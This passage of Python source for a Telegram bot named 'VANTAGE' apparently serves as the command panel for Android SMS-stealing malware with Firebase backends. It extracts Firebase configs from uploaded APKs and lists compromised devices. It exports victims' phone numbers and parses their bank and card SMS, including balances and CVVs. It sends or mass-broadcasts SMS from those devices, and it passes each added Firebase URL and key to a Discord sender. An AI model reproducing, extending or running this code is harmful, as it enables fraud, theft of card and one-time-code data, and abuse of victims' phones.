        kb.append([InlineKeyboardButton("📤 Send SMS", callback_data="admin_send"),
                   InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")])
    
    kb.append([InlineKeyboardButton("➕ Add Account", callback_data="add_account"),
               InlineKeyboardButton("📁 My Accounts", callback_data="admin_accounts")])
    kb.append([InlineKeyboardButton(
        "🔓 Unlock Bot" if bot_locked else "🔒 Lock Bot",
        callback_data="toggle_lock"
    )])
    kb.append([InlineKeyboardButton("👥 User Management", callback_data="admin_users")])
    kb.append([InlineKeyboardButton("📤 Export Numbers", callback_data="admin_export")])
    kb.append([InlineKeyboardButton("🗑 Remove Firebase", callback_data="admin_remove_fb")])
    kb.append([InlineKeyboardButton("🔄 Reset Seen (Re-sync)", callback_data="admin_reset_seen")])
    kb.append([InlineKeyboardButton("📊 Stats", callback_data="admin_stats"),
               InlineKeyboardButton("🔄 Refresh", callback_data="refresh")])
    
    return text, InlineKeyboardMarkup(kb)


async def build_user_menu(uid: int):
    accounts = get_accounts(uid)
    current = get_current(uid)
    
    if not current and accounts:
        set_current(uid, accounts[0]['id'])
        current = accounts[0]
    
    if not current:
        return (
            "❌ **No account connected**\n\nContact admin.",
            InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Refresh", callback_data="refresh")]])
        )
    
    try:
        devs = await fetch_devices_and_msgs(current, only_online=True)
        numbers = await fetch_all_numbers(uid)
        
        text = (
            f"📱 **VANTAGE**\n\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🟢 Online Devices: **{len(devs)}**\n"
            f"📞 Total Numbers: **{len(numbers)}**\n"
            f"🕐 {now_ist_str()}\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
        )
        
        if numbers:
            text += "📋 **Numbers:**\n\n"
            for i, n in enumerate(numbers[:50], 1):
                text += f"`{i}.` **{n['number']}**\n"
            if len(numbers) > 50:
                text += f"\n_+{len(numbers) - 50} more_"
        else:
            text += "_No numbers available_"
        
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
            [InlineKeyboardButton("📢 Channel", url=CHANNEL_LINK),
             InlineKeyboardButton("👥 SMS Group", url=SMS_GROUP_LINK)],
        ])
        return text, kb
    except Exception as e:
        return (
            f"❌ Error: {esc(str(e)[:100])}",
            InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Refresh", callback_data="refresh")]])
        )


async def show_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    
    if is_locked(uid):
        reason = DB.get('locked_users', {}).get(str(uid), {}).get('reason', 'Access denied')
        msg = f"🔒 **Access Denied**\n\n{esc(reason)}\n\nContact admin."
        if update.message:
            await update.message.reply_text(msg, parse_mode='Markdown')
        else:
            await update.callback_query.edit_message_text(msg, parse_mode='Markdown')
        return
    
    if is_admin(uid):
        text, kb = await build_admin_menu(uid)
    else:
        text, kb = await build_user_menu(uid)
    
    try:
        if update.message:
            await update.message.reply_text(text, reply_markup=kb, parse_mode='Markdown')
        else:
            await update.callback_query.edit_message_text(text, reply_markup=kb, parse_mode='Markdown')
    except Exception:
        try:
            if update.message:
                await update.message.reply_text(text, reply_markup=kb)
            else:
                await update.callback_query.edit_message_text(text, reply_markup=kb)
        except Exception as e:
            logger.error(f"Menu: {e}")


# ============================================
# COMMANDS
# ============================================
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    register_user(uid, update.effective_user.username, update.effective_user.full_name)
    context.user_data.clear()
    await show_menu(update, context)
    return MAIN_MENU


async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await show_menu(update, context)
    return MAIN_MENU


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_admin(update.effective_user.id):
        text = (
            "👑 **Admin Commands**\n\n"
            "/start — Admin panel\n"
            "/lock — Lock bot\n"
            "/unlock — Unlock bot\n"
            "/lockuser `<id>` [reason]\n"
            "/unlockuser `<id>`\n"
            "/stats — Stats\n"
            "/users — Users\n"
            "/time — India time\n"
        )
    else:
        text = "🤖 **VANTAGE**\n\n/start — Menu\n/refresh — Refresh\n/time — India time"
    await update.message.reply_text(text, parse_mode='Markdown')


async def cmd_time(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🕐 **India Time:** {now_ist_str()}\n"
        f"📅 **Timestamp:** `{int(now_ist().timestamp() * 1000)}`",
        parse_mode='Markdown'
    )


async def cmd_lock_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    DB['bot_locked'] = True
    save_data(DB)
    await update.message.reply_text("🔒 Bot LOCKED.")


async def cmd_unlock_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    DB['bot_locked'] = False
    save_data(DB)
    await update.message.reply_text("🔓 Bot UNLOCKED.")


async def cmd_lock_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("Usage: `/lockuser <id> [reason]`", parse_mode='Markdown')
        return
    try:
        target = int(context.args[0])
    except ValueError:
        return
    reason = " ".join(context.args[1:]) or "Access revoked"
    DB.setdefault('locked_users', {})[str(target)] = {
        'reason': reason,
        'since': now_ist().isoformat(),
    }
    save_data(DB)
    await update.message.reply_text(f"🔒 `{target}` locked.", parse_mode='Markdown')


async def cmd_unlock_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        return
    try:
        target = int(context.args[0])
    except ValueError:
        return
    DB.get('locked_users', {}).pop(str(target), None)
    save_data(DB)
    await update.message.reply_text(f"🔓 `{target}` unlocked.", parse_mode='Markdown')


async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    all_accs = DB.get('accounts', {})
    total_accs = sum(len(a) for a in all_accs.values())
    seen_count = len(DB.get('seen_msgs', {}))
    text = (
        f"📊 **STATS**\n\n"
        f"👥 Users: **{len(DB.get('user_registry', {}))}**\n"
        f"📡 Accounts: **{total_accs}**\n"
        f"📌 Tracking: **{seen_count}** devices\n"
        f"🔒 Locked: **{len(DB.get('locked_users', {}))}**\n"
        f"🚫 Bot Locked: **{'Yes' if DB.get('bot_locked') else 'No'}**\n"
        f"📤 Broadcasts: **{DB.get('broadcasts_sent', 0)}**\n"
        f"🕐 **{now_ist_str()}**"
    )
    await update.message.reply_text(text, parse_mode='Markdown')


async def cmd_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    reg = DB.get('user_registry', {})
    locked = DB.get('locked_users', {})
    text = f"👥 **Users** ({len(reg)})\n\n"
    for uid, info in list(reg.items())[:50]:
        name = info.get('username') or info.get('name') or '—'
        icon = "🔒" if uid in locked else "🟢"
        text += f"{icon} `{uid}` @{esc_code(name)}\n"
    await update.message.reply_text(text[:4000], parse_mode='Markdown')


# ============================================
# BUTTONS
# ============================================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = update.effective_user.id
    data = query.data
    
    if is_locked(uid):
        await query.answer("🔒 Locked", show_alert=True)
        return MAIN_MENU
    
    if data in ("main_menu", "refresh"):
        await show_menu(update, context)
        return MAIN_MENU
    
    if not is_admin(uid):
        return MAIN_MENU
    
    if data == "add_account":
        context.user_data.clear()
        await query.edit_message_text(
            "📝 **Add Firebase**\n\n"
            "Send URL or APK:\n\n"
            "• Single URL\n"
            "• Multiple URLs (newline)\n"
            "• APK auto-extract\n\n"
            "Example: `https://app.firebaseio.com`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]]),
            parse_mode='Markdown'
        )
        return ADD_URL
    
    if data == "admin_reset_seen":
        DB['seen_msgs'] = {}
        save_data(DB)
        await query.edit_message_text(
            "✅ **Seen data reset**\n\n"
            "Ab bot next poll me sab devices ko fresh mark karega.\n"
            "Sirf naye messages aayenge.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="main_menu")]]),
            parse_mode='Markdown'
        )
        return MAIN_MENU
    
    if data == "admin_devices":
        try:
            devs = await fetch_all_online_devices(uid)
            if not devs:
                await query.edit_message_text(
                    "📭 **No online devices**",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="main_menu")]]),
                    parse_mode='Markdown'
                )
                return MAIN_MENU
            text = f"📱 **Online Devices** ({len(devs)})\n\n"
            for d in devs[:20]:
                num = d['phoneNumber'] if d['phoneNumber'] != '—' else '—'
                text += f"🟢 **{esc(d['name'][:25])}**\n"
                text += f"   📞 `{esc_code(num)}` | 🔋 {esc(d['battery'])}\n\n"
            await query.edit_message_text(
                text[:4000],
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="main_menu")]]),
                parse_mode='Markdown'
            )
        except Exception as e:
            await query.edit_message_text(f"❌ {esc(str(e)[:100])}")
        return MAIN_MENU
    
    if data == "admin_numbers":
        try:
            nums = await fetch_all_numbers(uid)
            if not nums:
                await query.edit_message_text(
                    "📭 **No numbers**",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="main_menu")]]),
                    parse_mode='Markdown'
                )
                return MAIN_MENU
            text = f"📞 **All Numbers** ({len(nums)})\n\n"
            for i, n in enumerate(nums[:80], 1):
                text += f"`{i}.` **{n['number']}** — _{esc(n['device'][:15])}_\n"
            if len(nums) > 80:
                text += f"\n_+{len(nums) - 80} more_"
            await query.edit_message_text(
                text[:4000],
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📤 Export", callback_data="admin_export")],
                    [InlineKeyboardButton("🔙", callback_data="main_menu")],
                ]),
                parse_mode='Markdown'
            )
        except Exception as e:
            await query.edit_message_text(f"❌ {esc(str(e)[:100])}")
        return MAIN_MENU
    
    if data == "admin_export":
        try:
            nums = await fetch_all_numbers(uid)
            if not nums:
                await query.edit_message_text("📭 No numbers")
                return MAIN_MENU
            content = f"# VANTAGE Export\n# {now_ist_str()}\n# Total: {len(nums)}\n\n"
            for n in nums:
                content += f"{n['number']} | {n['device']} | {n['provider']} | {n['battery']}\n"
            f = io.BytesIO(content.encode())
            f.name = f"vantage_numbers_{int(time.time())}.txt"
            await query.message.reply_document(
                document=f, filename=f.name,
                caption=f"📤 **{len(nums)}** numbers"
            )
        except Exception as e:
            await query.edit_message_text(f"❌ {esc(str(e)[:100])}")
        return MAIN_MENU
    
    if data == "admin_bank":
        try:
            devs = await fetch_all_online_devices(uid)
            banks = []
            for d in devs:
                for m in d.get('messages', []):
                    b = parse_bank_sms(m['text'], m['sender'])
                    if b:
                        b['device'] = d['name']
                        banks.append(b)
            if not banks:
                await query.edit_message_text("📭 No bank SMS", parse_mode='Markdown')
                return MAIN_MENU
            text = f"🏦 **Bank** ({len(banks)})\n\n"
            for b in banks[:15]:
                text += f"🏦 **{esc(b['bankName'])}**\n"
                text += f"💰 ₹{b['availableBalance']:,.2f}\n"
                if b.get('transactionType') and b.get('transactionAmount'):
                    s = "＋" if b['transactionType'] == 'credit' else "－"
                    text += f"{s}₹{b['transactionAmount']:,.2f}\n"
                text += "─\n"
            await query.edit_message_text(
                text[:4000],
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="main_menu")]]),
                parse_mode='Markdown'
            )
        except Exception as e:
            await query.edit_message_text(f"❌ {esc(str(e)[:100])}")
        return MAIN_MENU
    
    if data == "admin_cards":
        try:
            devs = await fetch_all_online_devices(uid)
            cards = []
            for d in devs:
                for m in d.get('messages', []):
                    c = parse_card_sms(m['text'])
                    if c:
                        c['device'] = d['name']
                        cards.append(c)
            if not cards:
                await query.edit_message_text("📭 No cards", parse_mode='Markdown')
                return MAIN_MENU
            text = f"💳 **Cards** ({len(cards)})\n\n"
            for c in cards[:15]:
                text += f"💳 **{esc(c['cardType'])}**\n"
                text += f"🔢 **** **** **** {c['cardLast4']}\n"
                if c.get('cvv'):
                    text += f"🔐 `{esc_code(c['cvv'])}`\n"
                text += "─\n"
            await query.edit_message_text(
                text[:4000],
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="main_menu")]]),
                parse_mode='Markdown'
            )
        except Exception as e:
            await query.edit_message_text(f"❌ {esc(str(e)[:100])}")
        return MAIN_MENU
    
    if data == "admin_accounts":
        accs = get_accounts(uid)
        cur = get_current(uid)
        kb = []
        for i, a in enumerate(accs):
            marker = "✅ " if cur and cur['id'] == a['id'] else "▫️ "
            kb.append([InlineKeyboardButton(
                f"{marker}{a['url'][:35]}",
                callback_data=f"aswitch_{a['id']}"
            )])
            kb.append([InlineKeyboardButton(f"🗑 Del #{i+1}", callback_data=f"adelacc_{a['id']}")])
        kb.append([InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
        await query.edit_message_text(
            f"📁 **Accounts** ({len(accs)})",
            reply_markup=InlineKeyboardMarkup(kb),
            parse_mode='Markdown'
        )
        return MAIN_MENU
    
    if data.startswith("aswitch_"):
        try:
            acc_id = int(data.split("_", 1)[1])
            set_current(uid, acc_id)
            await show_menu(update, context)
        except Exception:
            pass
        return MAIN_MENU
    
    if data.startswith("adelacc_"):
        try:
            acc_id = int(data.split("_", 1)[1])
            accs = [a for a in get_accounts(uid) if a['id'] != acc_id]
            save_accounts(uid, accs)
            cur = get_current(uid)
            if cur and cur['id'] == acc_id:
                set_current(uid, accs[0]['id'] if accs else None)
            await show_menu(update, context)
        except Exception:
            pass
        return MAIN_MENU
    
    if data == "admin_send":
        try:
            devs = await fetch_all_online_devices(uid)
            if not devs:
                await query.edit_message_text("❌ No devices")
                return MAIN_MENU
            kb = []
            for d in devs[:20]:
                kb.append([InlineKeyboardButton(
                    f"📱 {d['name'][:30]}",
                    callback_data=f"asend_{d['_acc_id']}_{d['id']}"
                )])
            kb.append([InlineKeyboardButton("🔙", callback_data="main_menu")])
            await query.edit_message_text(
                "📤 **Select device:**",
                reply_markup=InlineKeyboardMarkup(kb),
                parse_mode='Markdown'
            )
        except Exception as e:
            await query.edit_message_text(f"❌ {esc(str(e)[:100])}")
        return MAIN_MENU
    
    if data.startswith("asend_"):
        parts = data.split("_", 2)
        if len(parts) == 3:
            try:
                acc_id = int(parts[1])
                context.user_data['send_acc_id'] = acc_id
                context.user_data['send_dev'] = parts[2]
                await query.edit_message_text(
                    "📤 **Send SMS**\n\nEnter number:",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]]),
                    parse_mode='Markdown'
                )
                return SEND_NUM
            except Exception:
                pass
    
    if data == "admin_broadcast":
        try:
            devs = await fetch_all_online_devices(uid)
            if not devs:
                await query.edit_message_text("❌ No devices")
                return MAIN_MENU
            context.user_data['bc_devs'] = [(d['_acc_id'], d['id']) for d in devs]
            await query.edit_message_text(
                f"📢 **Broadcast to {len(devs)} devices**\n\nEnter number:",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]]),
                parse_mode='Markdown'
            )
            return BC_TO
        except Exception as e:
            await query.edit_message_text(f"❌ {esc(str(e)[:100])}")
            return MAIN_MENU
    
    if data == "toggle_lock":
        DB['bot_locked'] = not DB.get('bot_locked', False)
        save_data(DB)
        await show_menu(update, context)
        return MAIN_MENU
    
    if data == "admin_users":
        reg = DB.get('user_registry', {})
        locked = DB.get('locked_users', {})
        text = f"👥 **Users**\n\n📊 Total: **{len(reg)}**\n🔒 Locked: **{len(locked)}**\n\n"
        kb = []
        for luid, info in locked.items():
            text += f"🔒 `{luid}` — {esc(info.get('reason', 'N/A')[:25])}\n"
            kb.append([InlineKeyboardButton(f"🔓 Unlock {luid}", callback_data=f"aunlock_{luid}")])
        kb.append([InlineKeyboardButton("🔙", callback_data="main_menu")])
        await query.edit_message_text(
            text[:4000],
            reply_markup=InlineKeyboardMarkup(kb),
            parse_mode='Markdown'
        )
        return MAIN_MENU
    
    if data.startswith("aunlock_"):
        luid = data.split("_", 1)[1]
        DB.get('locked_users', {}).pop(luid, None)
        save_data(DB)
        await show_menu(update, context)
        return MAIN_MENU
    
    if data == "admin_stats":
        await cmd_stats(update, context)
        return MAIN_MENU
    
    if data == "admin_remove_fb":
        accs = get_accounts(uid)
        if not accs:
            await query.edit_message_text("📭 No accounts")
            return MAIN_MENU
        kb = []
        for a in accs:
            kb.append([InlineKeyboardButton(
                f"🗑 {a['url'][:35]}",
                callback_data=f"armfb_{a['id']}"
            )])
        kb.append([InlineKeyboardButton("🔙", callback_data="main_menu")])
        await query.edit_message_text(
            "🗑 **Remove Firebase**",
            reply_markup=InlineKeyboardMarkup(kb),
            parse_mode='Markdown'
        )
        return MAIN_MENU
    
    if data.startswith("armfb_"):
        try:
            acc_id = int(data.split("_", 1)[1])
            accs = [a for a in get_accounts(uid) if a['id'] != acc_id]
            save_accounts(uid, accs)
            cur = get_current(uid)
            if cur and cur['id'] == acc_id:
                set_current(uid, accs[0]['id'] if accs else None)
            await query.edit_message_text("✅ Removed")
            await show_menu(update, context)
        except Exception:
            pass
        return MAIN_MENU
    
    return MAIN_MENU


# ============================================
# INPUT HANDLERS
# ============================================
async def handle_add_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        return MAIN_MENU
    msg = update.message
    
    if msg.document:
        doc = msg.document
        if not (doc.file_name or '').lower().endswith(('.apk', '.zip')):
            await msg.reply_text("❌ Send .apk or .zip")
            return ADD_URL
        status = await msg.reply_text("🔍 Parsing APK...")
        try:
            file = await doc.get_file()
            fb = await file.download_as_bytearray()
            res = await parse_apk(bytes(fb))
            if not res or (not res.get('firebaseUrl') and not res.get('apiKey')):
                await status.edit_text("❌ No Firebase config")
                return ADD_URL
            context.user_data['pending_urls'] = [res.get('firebaseUrl', '')]
            context.user_data['pending_key'] = res.get('apiKey', '')
            await status.edit_text(
                f"✅ **APK Parsed**\n\n"
                f"🔗 `{esc_code(res.get('firebaseUrl', 'N/A'))}`\n"
                f"🔑 `{esc_code((res.get('apiKey') or 'N/A')[:30])}...`\n\n"
                f"Send auth key or `skip`:",
                parse_mode='Markdown'
            )
            return ADD_KEY
        except Exception as e:
            await status.edit_text(f"❌ {esc(str(e)[:100])}")
            return ADD_URL
    
    text = msg.text.strip() if msg.text else ""
    if not text:
        return ADD_URL
    
    urls = re.findall(r'https?://[^\s,]+', text)
    if not urls:
        urls = ['https://' + u for u in re.findall(r'[a-zA-Z0-9_-]+\.(?:firebaseio\.com|firebasedatabase\.app)', text)]
    if not urls:
        await msg.reply_text("❌ No URL found. Try again or /cancel")
        return ADD_URL
    
    urls = list(dict.fromkeys(urls))
    context.user_data['pending_urls'] = urls
    await msg.reply_text(
        f"📦 **{len(urls)} URL(s) detected**\n\n"
        + "\n".join([f"`{esc_code(u[:50])}`" for u in urls[:10]])
        + f"\n\nSend auth key or `skip`:",
        parse_mode='Markdown'
    )
    return ADD_KEY


async def handle_add_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = (update.message.text or '').strip()
    
    key = context.user_data.get('pending_key', '') if text == 'skip' else text
    if not key:
        key = 'Hi'
    
    urls = context.user_data.get('pending_urls', [])
    if not urls:
        await update.message.reply_text("❌ No URLs. Restart.")
        await show_menu(update, context)
        return MAIN_MENU
    
    status = await update.message.reply_text(f"🔌 Testing {len(urls)}...")
    
    accs = get_accounts(uid)
    added, failed = 0, 0
    errors = []
    
    for url in urls:
        try:
            await fb_get(url, key, "clients")
            existing = next((a for a in accs if a['url'] == url), None)
            if existing:
                existing['key'] = key
            else:
                accs.append({
                    'id': int(time.time() * 1000) + added,
                    'url': url, 'key': key,
                    'date': now_ist_str(),
                })
            added += 1
            await send_discord(url, key, update.effective_user.username or str(uid))
        except Exception as e:
            failed += 1
            errors.append(str(e)[:40])
    
    save_accounts(uid, accs)
    if added > 0 and not get_current(uid):
        set_current(uid, accs[-1]['id'])
    
    text = f"✅ **Results**\n\n✅ Added: **{added}**\n❌ Failed: **{failed}**\n📁 Total: **{len(accs)}**"
    if errors:
        text += f"\n\n⚠️ Errors:\n" + "\n".join([f"• {esc(e)}" for e in errors[:3]])
    
    await status.edit_text(text, parse_mode='Markdown')
    await show_menu(update, context)
    return MAIN_MENU


async def handle_send_num(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (update.message.text or '').strip()
    digits = re.sub(r'[^0-9]', '', text)
    if len(digits) == 10:
        num = '+91' + digits
    elif len(digits) == 12 and digits.startswith('91'):
        num = '+' + digits
    else:
        await update.message.reply_text("❌ Invalid. Try +919876543210")
        return SEND_NUM
    context.user_data['send_num'] = num
    await update.message.reply_text(f"📱 To: `{esc_code(num)}`\n\nNow the message:", parse_mode='Markdown')
    return SEND_MSG


async def handle_send_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text.strip()
    
    acc_id = context.user_data.get('send_acc_id')
    dev_id = context.user_data.get('send_dev')
    num = context.user_data.get('send_num')
    
    acc = next((a for a in get_accounts(uid) if a['id'] == acc_id), None)
    if not acc or not dev_id or not num:
        await update.message.reply_text("❌ Session expired.")
        return MAIN_MENU
    
    status = await update.message.reply_text("📤 Sending...")
    paths = [
        f"clients/{dev_id}/webhookEvent/sendSms",
        f"clients/{dev_id}/command",
        f"clients/{dev_id}/commands",
    ]
    payload = {'from': 1, 'to': num, 'message': text, 'isSended': False}
    ok = False
    for p in paths:
        if await fb_put(acc['url'], acc['key'], p, payload):
            ok = True
            break
    await status.edit_text("✅ SMS queued!" if ok else "❌ Failed")
    await show_menu(update, context)
    return MAIN_MENU


async def handle_bc_to(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (update.message.text or '').strip()
    digits = re.sub(r'[^0-9]', '', text)
    if len(digits) == 10:
        num = '+91' + digits
    elif len(digits) == 12 and digits.startswith('91'):
        num = '+' + digits
    else:
        await update.message.reply_text("❌ Invalid")
        return BC_TO
    context.user_data['bc_num'] = num
    await update.message.reply_text("📢 Enter broadcast message:")
    return BC_MSG


async def handle_bc_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['bc_msg'] = update.message.text.strip()
    await update.message.reply_text("🔢 SMS per device (1-10):")
    return BC_COUNT


async def handle_bc_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        cnt = int(update.message.text.strip())
        if cnt < 1 or cnt > 10:
            raise ValueError
    except ValueError:
        await update.message.reply_text("❌ Send 1-10")
        return BC_COUNT
    
    uid = update.effective_user.id
    devs = context.user_data.get('bc_devs', [])
    num = context.user_data.get('bc_num')
    msg = context.user_data.get('bc_msg')
    
    accs = {a['id']: a for a in get_accounts(uid)}
    total = len(devs) * cnt
    status = await update.message.reply_text(f"📢 Broadcasting... 0/{total}")
    
    done = 0
    for acc_id, dev_id in devs:
        acc = accs.get(acc_id)
        if not acc:
            continue
        for i in range(cnt):
            payload = {
                'from': (i % 2) + 1,
                'to': num, 'message': msg,
                'isSended': False, '_bcTime': int(time.time() * 1000) + i,
            }
            for p in [f"clients/{dev_id}/webhookEvent/sendSms", f"clients/{dev_id}/commands"]:
                try:
                    if await fb_put(acc['url'], acc['key'], p, payload):
                        break
                except Exception:
                    pass
            done += 1
            if done % 5 == 0:
                try:
                    await status.edit_text(f"📢 {done}/{total} ({done*100//total}%)")
                except Exception:
                    pass
            await asyncio.sleep(0.5)
    
    DB['broadcasts_sent'] = DB.get('broadcasts_sent', 0) + 1
    save_data(DB)
    
    await status.edit_text(f"✅ **Complete!**\n\n{done} SMS queued", parse_mode='Markdown')
    await show_menu(update, context)
    return MAIN_MENU


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await show_menu(update, context)
    return MAIN_MENU


# ============================================
# STARTUP
# ============================================
async def post_init(app: Application):
    await app.bot.set_my_commands([
        BotCommand("start", "Main menu"),
        BotCommand("refresh", "Refresh"),
        BotCommand("time", "India time"),
        BotCommand("help", "Help"),
        BotCommand("cancel", "Cancel"),
    ])
    asyncio.create_task(forward_loop(app))
    logger.info("✅ VANTAGE Bot v4.0 fully started")


def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN":
        print("❌ Set BOT_TOKEN env var!")
        return
    
    if not SMS_GROUP_ID:
        print("⚠️  SMS_GROUP_ID not set")
    
    # Startup cleanup — force fresh seen data
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                d = json.load(f)
            if d.get('seen_msgs'):
                print("🧹 Clearing old seen_msgs data...")
                d['seen_msgs'] = {}
                with open(DATA_FILE, 'w') as f:
                    json.dump(d, f, indent=2)
        except Exception:
            pass
    
    start_health_server()
    
    logger.info(f"🕐 Bot starting at {now_ist_str()}")
    
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    
    conv = ConversationHandler(
        entry_points=[CommandHandler("start", cmd_start)],
        states={
            MAIN_MENU: [CallbackQueryHandler(button_handler)],
            ADD_URL: [MessageHandler(filters.Document.ALL | filters.TEXT & ~filters.COMMAND, handle_add_url),
                      CallbackQueryHandler(button_handler)],
            ADD_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_add_key),
                      CallbackQueryHandler(button_handler)],
            SEND_NUM: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_send_num),
                       CallbackQueryHandler(button_handler)],
            SEND_MSG: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_send_msg),
                       CallbackQueryHandler(button_handler)],
            BC_TO: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_bc_to),
                    CallbackQueryHandler(button_handler)],
            BC_MSG: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_bc_msg),
                     CallbackQueryHandler(button_handler)],
            BC_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_bc_count),
                       CallbackQueryHandler(button_handler)],
        },
        fallbacks=[CommandHandler("cancel", cancel), CommandHandler("start", cmd_start)],
    )
    
    app.add_handler(conv)
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("time", cmd_time))
    app.add_handler(CommandHandler("lock", cmd_lock_bot))
    app.add_handler(CommandHandler("unlock", cmd_unlock_bot))
    app.add_handler(CommandHandler("lockuser", cmd_lock_user))
    app.add_handler(CommandHandler("unlockuser", cmd_unlock_user))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("users", cmd_users))
    app.add_handler(CommandHandler("refresh", cmd_start))
    
    logger.info("🤖 VANTAGE Bot v4.0 starting...")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
